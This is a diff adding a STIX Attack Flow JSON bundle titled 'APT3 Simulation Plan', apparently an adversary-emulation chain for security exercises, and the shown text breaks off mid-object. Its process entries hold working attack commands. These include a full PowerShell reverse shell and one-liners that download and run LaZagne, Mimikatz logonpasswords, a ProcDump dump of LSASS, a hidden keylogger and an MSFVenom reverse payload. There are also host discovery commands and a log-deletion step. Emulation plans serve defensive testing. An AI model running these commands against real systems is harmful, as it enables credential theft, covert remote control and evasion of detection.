@@ -1,0 +1,1580 @@
+{
+    "type": "bundle",
+    "id": "bundle--cb28389c-14b7-4919-87f5-34052fca2416",
+    "objects": [
+        {
+            "type": "attack-flow",
+            "spec_version": "2.1",
+            "id": "attack-flow--19c39a19-f8da-4646-88f4-bf79b1903918",
+            "created": "2024-05-12T08:20:06.366552Z",
+            "modified": "2024-05-12T08:20:06.366552Z",
+            "name": "APT3",
+            "description": "APT3 Simulation Plan",
+            "scope": "other",
+            "start_refs": [
+                "attack-action--f975c871-961f-4764-85c6-02c7325440ce"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "extension-definition",
+            "spec_version": "2.1",
+            "id": "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4",
+            "created_by_ref": "identity--fb9c968a-745b-4ade-9b25-c324172197f4",
+            "created": "2022-08-02T19:34:35.143Z",
+            "modified": "2022-08-02T19:34:35.143Z",
+            "name": "Attack Flow",
+            "description": "Extends STIX 2.1 with features to create Attack Flows.",
+            "schema": "https://center-for-threat-informed-defense.github.io/attack-flow/stix/attack-flow-schema-2.0.0.json",
+            "version": "2.0.0",
+            "extension_types": [
+                "new-sdo"
+            ],
+            "external_references": [
+                {
+                    "source_name": "Documentation",
+                    "description": "Documentation for Attack Flow",
+                    "url": "https://center-for-threat-informed-defense.github.io/attack-flow"
+                },
+                {
+                    "source_name": "GitHub",
+                    "description": "Source code repository for Attack Flow",
+                    "url": "https://github.com/center-for-threat-informed-defense/attack-flow"
+                }
+            ]
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--f975c871-961f-4764-85c6-02c7325440ce",
+            "created": "2024-05-12T08:20:06.366552Z",
+            "modified": "2024-05-12T08:20:06.366552Z",
+            "technique_id": "T1046",
+            "name": "T1046",
+            "description": "Run simple Nmap scan",
+            "command_ref": "process--ca472c0e-0fbd-43df-a871-43423eac1f28",
+            "asset_refs": [
+                "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9"
+            ],
+            "effect_refs": [
+                "attack-condition--d99fabfa-5473-411c-a5af-0405dab69b78"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "Attacker",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--ca472c0e-0fbd-43df-a871-43423eac1f28",
+            "command_line": "nmap -Pn -n -T4 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 "
+        },
+        {
+            "type": "attack-condition",
+            "spec_version": "2.1",
+            "id": "attack-condition--d99fabfa-5473-411c-a5af-0405dab69b78",
+            "created": "2024-05-12T08:20:06.366044Z",
+            "modified": "2024-05-12T08:20:06.366044Z",
+            "description": "get_reverse_shell_windows => $LHOST = \"\"; $LPORT = 9595; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
+            "on_true_refs": [
+                "attack-action--0a79901e-049c-44f5-9b7c-1b9b557e292d"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--0a79901e-049c-44f5-9b7c-1b9b557e292d",
+            "created": "2024-05-12T08:20:06.364556Z",
+            "modified": "2024-05-12T08:20:06.364556Z",
+            "technique_id": "T1566.001",
+            "name": "T1566.001",
+            "description": "Give remote shell under non-privileged account(run .ps1 => reverse shell)",
+            "command_ref": "process--2d40a4d2-41df-49a1-8b64-4cf8621867a4",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--4e11f56a-ea60-4666-bf11-430d0280ec97",
+                "attack-action--f8556ad6-cf87-4112-b286-cadaa605241d"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--2d40a4d2-41df-49a1-8b64-4cf8621867a4",
+            "command_line": "# Execution not required for this action, only set up."
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--f8556ad6-cf87-4112-b286-cadaa605241d",
+            "created": "2024-05-12T08:20:06.364063Z",
+            "modified": "2024-05-12T08:20:06.364063Z",
+            "technique_id": "T1204.002",
+            "name": "T1204.002",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--4e11f56a-ea60-4666-bf11-430d0280ec97",
+            "created": "2024-05-12T08:20:06.363565Z",
+            "modified": "2024-05-12T08:20:06.363565Z",
+            "technique_id": "T1016",
+            "name": "T1016",
+            "description": "System Network Configuration Discovery on Windows",
+            "command_ref": "process--2a416c82-2c94-4c62-ba2b-5a7ac281e748",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--de7c89bd-d704-4f2c-abd1-4b0284d632b9"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--2a416c82-2c94-4c62-ba2b-5a7ac281e748",
+            "command_line": "ipconfig /all\n;netsh interface show interface\n;arp -a\n;nbtstat -n\n;net config"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--de7c89bd-d704-4f2c-abd1-4b0284d632b9",
+            "created": "2024-05-12T08:20:06.363068Z",
+            "modified": "2024-05-12T08:20:06.363068Z",
+            "technique_id": "T1057",
+            "name": "T1057",
+            "description": "Process Discovery - tasklist,Get-Process",
+            "command_ref": "process--f4b06d10-d110-4846-a786-213d23124731",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--317ad103-3461-45aa-b590-85e36985d0e4"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--f4b06d10-d110-4846-a786-213d23124731",
+            "command_line": "tasklist\n;Get-Process\n;get-wmiObject -class Win32_Process"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--317ad103-3461-45aa-b590-85e36985d0e4",
+            "created": "2024-05-12T08:20:06.362076Z",
+            "modified": "2024-05-12T08:20:06.362076Z",
+            "technique_id": "T1083",
+            "name": "T1083",
+            "description": "File and Directory Discovery (cmd.exe)",
+            "command_ref": "process--b1f5f5b5-b1e6-47c5-a921-25fe12984026",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--446b83cb-f98c-40a7-8410-fce5346661aa",
+                "attack-action--d257a2c5-2b49-4c96-94cd-e5c0af03b02b"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--b1f5f5b5-b1e6-47c5-a921-25fe12984026",
+            "command_line": "dir /s c:\\ >> T1083_cmd_text.txt\n;dir /s \"c:\\Documents and Settings\" >> T1083_cmd_text.txt\n;dir /s \"c:\\Program Files\\\" >> T1083_cmd_text.txt\n;dir \"%systemdrive%\\Users\\*.*\" >> T1083_cmd_text.txt\n;dir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> T1083_cmd_text.txt\n;dir \"%userprofile%\\Desktop\\*.*\" >> T1083_cmd_text.txt\n;tree /F >> T1083_cmd_text.txt\n;dir c:\\"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--d257a2c5-2b49-4c96-94cd-e5c0af03b02b",
+            "created": "2024-05-12T08:20:06.36158Z",
+            "modified": "2024-05-12T08:20:06.36158Z",
+            "technique_id": "T1552.001: Credentials In Files",
+            "name": "T1552.001: Credentials In Files",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--446b83cb-f98c-40a7-8410-fce5346661aa",
+            "created": "2024-05-12T08:20:06.361084Z",
+            "modified": "2024-05-12T08:20:06.361084Z",
+            "technique_id": "T1069.001",
+            "name": "T1069.001",
+            "description": "Local Permission Groups Discovery",
+            "command_ref": "process--cabd24e1-f6da-4cbe-a3e6-757935b222b0",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--13ab8a4f-cce4-4ab9-ad4d-af8502a48350",
+                "attack-action--5b2e9144-a1fa-45c9-8950-8a4910322496"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--cabd24e1-f6da-4cbe-a3e6-757935b222b0",
+            "command_line": "net localgroup\n;net localgroup \"Administrators\"\n;get-localgroup\n;Get-LocalGroupMember -Name \"Administrators\""
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--5b2e9144-a1fa-45c9-8950-8a4910322496",
+            "created": "2024-05-12T08:20:06.360588Z",
+            "modified": "2024-05-12T08:20:06.360588Z",
+            "technique_id": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--13ab8a4f-cce4-4ab9-ad4d-af8502a48350",
+            "created": "2024-05-12T08:20:06.360092Z",
+            "modified": "2024-05-12T08:20:06.360092Z",
+            "technique_id": "T1552.001",
+            "name": "T1552.001",
+            "description": "Extract Browser and System credentials with LaZagne",
+            "command_ref": "process--7df684cf-7e5e-4120-b45f-5548b9fa239a",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--266d3a7e-ff68-4d3f-9300-357fc6f08f4c",
+                "attack-action--6027c0f2-e3b8-4805-8519-1e7039f45520"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--7df684cf-7e5e-4120-b45f-5548b9fa239a",
+            "command_line": "wget http:///LaZagne.exe -OutFile LaZagne.exe; .\\LaZagne.exe all\n;\n"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--6027c0f2-e3b8-4805-8519-1e7039f45520",
+            "created": "2024-05-12T08:20:06.359596Z",
+            "modified": "2024-05-12T08:20:06.359596Z",
+            "technique_id": "T1105",
+            "name": "T1105",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--266d3a7e-ff68-4d3f-9300-357fc6f08f4c",
+            "created": "2024-05-12T08:20:06.359124Z",
+            "modified": "2024-05-12T08:20:06.359124Z",
+            "technique_id": "T1003.001",
+            "name": "T1003.001",
+            "description": "Dump LSASS.exe Memory using ProcDump",
+            "command_ref": "process--62cf9e69-e798-4174-99bb-12fee0fef746",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--cd0293be-54e0-4279-88b4-35f1b066fb21",
+                "attack-action--b780bdc1-37a6-47f2-8997-d570f342ef31"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--62cf9e69-e798-4174-99bb-12fee0fef746",
+            "command_line": "wget http:///procdump.exe -OutFile procdump.exe; .\\procdump.exe -accepteula -ma lsass.exe lsass.dmp\n;\n;\n"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--b780bdc1-37a6-47f2-8997-d570f342ef31",
+            "created": "2024-05-12T08:20:06.358108Z",
+            "modified": "2024-05-12T08:20:06.358108Z",
+            "technique_id": "T1105: Ingress Tool Transfer",
+            "name": "T1105: Ingress Tool Transfer",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--cd0293be-54e0-4279-88b4-35f1b066fb21",
+            "created": "2024-05-12T08:20:06.358108Z",
+            "modified": "2024-05-12T08:20:06.358108Z",
+            "technique_id": "T1003.001",
+            "name": "T1003.001",
+            "description": "Mimikatz.exe logonpasswords",
+            "command_ref": "process--ec04b6b1-cedb-4ede-9d8b-ed8649d56737",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--61624c11-d94f-40c2-9ac8-09f910d6cb6e",
+                "attack-action--0ffa03b3-a5b4-4ce1-bdab-8a84018a7abe",
+                "attack-action--0020bdf7-1f30-40d5-ade7-e209d9d3a4b3"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--ec04b6b1-cedb-4ede-9d8b-ed8649d56737",
+            "command_line": "wget http:///mimikatz.exe -OutFile mimikatz.exe; .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--0ffa03b3-a5b4-4ce1-bdab-8a84018a7abe",
+            "created": "2024-05-12T08:20:06.357612Z",
+            "modified": "2024-05-12T08:20:06.357612Z",
+            "technique_id": "T1105: Ingress Tool Transfer",
+            "name": "T1105: Ingress Tool Transfer",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--0020bdf7-1f30-40d5-ade7-e209d9d3a4b3",
+            "created": "2024-05-12T08:20:06.357612Z",
+            "modified": "2024-05-12T08:20:06.357612Z",
+            "technique_id": "T1134: Access Token Manipulation",
+            "name": "T1134: Access Token Manipulation",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--61624c11-d94f-40c2-9ac8-09f910d6cb6e",
+            "created": "2024-05-12T08:20:06.357116Z",
+            "modified": "2024-05-12T08:20:06.357116Z",
+            "technique_id": "T1056.001",
+            "name": "T1056.001",
+            "description": "Run keylogger script in background",
+            "command_ref": "process--79cab32e-eab1-4671-b9b8-d4ab06930efc",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--72076276-608e-4340-ba03-b9fcfcb50823",
+                "attack-action--f28ace19-9e8f-41c1-9308-b90289d97706"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--79cab32e-eab1-4671-b9b8-d4ab06930efc",
+            "command_line": "wget http:///Get-Keystrokes.ps1 -OutFile Get-Keystrokes.ps1; powershell.exe -windowstyle hidden -file Get-Keystrokes.ps1"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--f28ace19-9e8f-41c1-9308-b90289d97706",
+            "created": "2024-05-12T08:20:06.35662Z",
+            "modified": "2024-05-12T08:20:06.35662Z",
+            "technique_id": "T1105: Ingress Tool Transfer",
+            "name": "T1105: Ingress Tool Transfer",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--72076276-608e-4340-ba03-b9fcfcb50823",
+            "created": "2024-05-12T08:20:06.35662Z",
+            "modified": "2024-05-12T08:20:06.35662Z",
+            "technique_id": "T1003.005",
+            "name": "T1003.005",
+            "description": "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe",
+            "command_ref": "process--e29d921d-6c25-4fe3-a9e8-a337c10eaf1c",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-condition--d1f19988-8704-4ab1-8525-b62a612f6310",
+                "attack-action--7c274273-47a1-47b0-9b05-bd6f1b7d9712"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--e29d921d-6c25-4fe3-a9e8-a337c10eaf1c",
+            "command_line": "cmdkey /list"
+        },
+        {
+            "type": "attack-condition",
+            "spec_version": "2.1",
+            "id": "attack-condition--d1f19988-8704-4ab1-8525-b62a612f6310",
+            "created": "2024-05-12T08:20:06.35662Z",
+            "modified": "2024-05-12T08:20:06.35662Z",
+            "description": "create_file_on_host => echo pQN0csr > C:\\Windows\\Logs\\T1070.004_1_logs.log",
+            "on_true_refs": [
+                "attack-action--91974b11-01a4-4f02-9b25-0424a41af316"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--7c274273-47a1-47b0-9b05-bd6f1b7d9712",
+            "created": "2024-05-12T08:20:06.355652Z",
+            "modified": "2024-05-12T08:20:06.355652Z",
+            "technique_id": "T1059.001: Command and Scripting Interpreter, PowerShell",
+            "name": "T1059.001: Command and Scripting Interpreter, PowerShell",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--91974b11-01a4-4f02-9b25-0424a41af316",
+            "created": "2024-05-12T08:20:06.355132Z",
+            "modified": "2024-05-12T08:20:06.355132Z",
+            "technique_id": "T1070.004",
+            "name": "T1070.004",
+            "description": "Delete file from privleged \"logs\" folder",
+            "command_ref": "process--83424572-3720-4c64-8089-f118565c76d7",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--e8c7c05a-ed6d-48d3-9bf0-ca69744d9c6b",
+                "attack-action--dcba7812-4e5f-4207-b8af-7208980acf12"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--83424572-3720-4c64-8089-f118565c76d7",
+            "command_line": "del C:\\Windows\\Logs\\T1070.004_1_logs.log"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--dcba7812-4e5f-4207-b8af-7208980acf12",
+            "created": "2024-05-12T08:20:06.354636Z",
+            "modified": "2024-05-12T08:20:06.354636Z",
+            "technique_id": "T1027.005: Obfuscated Files or Information: Indicator Removal from Tools",
+            "name": "T1027.005: Obfuscated Files or Information: Indicator Removal from Tools",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--e8c7c05a-ed6d-48d3-9bf0-ca69744d9c6b",
+            "created": "2024-05-12T08:20:06.354636Z",
+            "modified": "2024-05-12T08:20:06.354636Z",
+            "technique_id": "T1204.002",
+            "name": "T1204.002",
+            "description": "Run MSFVenom generated payload to get meterpreter session",
+            "command_ref": "process--e8338064-7818-462f-8d7d-a477ba1d4c2c",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--c18195ee-1273-4048-b112-0188b915339a",
+                "attack-action--5c6738f2-f428-45b6-9f84-587daca9e254"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--e8338064-7818-462f-8d7d-a477ba1d4c2c",
+            "command_line": "wget http:///tcp_reverse.exe -OutFile tcp_reverse.exe; .\\tcp_reverse.exe"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--5c6738f2-f428-45b6-9f84-587daca9e254",
+            "created": "2024-05-12T08:20:06.353644Z",
+            "modified": "2024-05-12T08:20:06.353644Z",
+            "technique_id": "T1027: Obfuscated Files or Information",
+            "name": "T1027: Obfuscated Files or Information",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--c18195ee-1273-4048-b112-0188b915339a",
+            "created": "2024-05-12T08:20:06.353644Z",
+            "modified": "2024-05-12T08:20:06.353644Z",
+            "technique_id": "T1574.002",
+            "name": "T1574.002",
